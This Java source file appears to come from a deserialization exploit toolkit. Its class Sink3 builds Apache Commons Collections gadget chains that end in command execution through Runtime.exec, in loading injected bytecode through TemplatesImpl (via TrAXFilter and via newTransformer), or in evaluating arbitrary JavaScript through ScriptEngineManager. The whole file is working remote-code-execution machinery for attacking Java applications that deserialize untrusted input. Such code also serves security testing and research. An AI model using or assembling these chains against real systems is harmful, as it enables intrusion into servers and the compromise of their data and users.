import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import javax.xml.transform.Templates;


public class Sink3 {
    public static SinkResult RuntimeExecSink(String command) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command}),
        };
        Transformer transformer = new ChainedTransformer(transformers);

        return new SinkResult(SinkResultID.RuntimeExec, transformer, null, null);
    }

    public static SinkResult TemplatesImplTrAXFilterSink(String code) throws Exception {
        TemplatesImpl templates = Utils.generateTemplates(code);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };

        Transformer transformer = new ChainedTransformer(transformers);
        return new SinkResult(SinkResultID.TemplatesImplTrAXFilter, transformer, null, templates);
    }

    public static SinkResult TemplatesImplNewTransformerSink(String code) throws Exception {
        TemplatesImpl templates = Utils.generateTemplates(code);

        Transformer transformer = new InvokerTransformer("newTransformer", null, null);

        return new SinkResult(SinkResultID.TemplatesImplNewTransformer, transformer, null, templates);
    }

    public static SinkResult ScriptEngineManagerSink(String code) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class),
                new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                new InvokerTransformer("getEngineByName", new Class[]{String.class},
                        new Object[]{"JavaScript"}), new InvokerTransformer("eval",
                new Class[]{String.class}, new String[]{code}),
                new ConstantTransformer(1)};

        Transformer transformer = new ChainedTransformer(transformers);

        return new SinkResult(SinkResultID.ScriptEngineManager, transformer, null, null);
    }



}
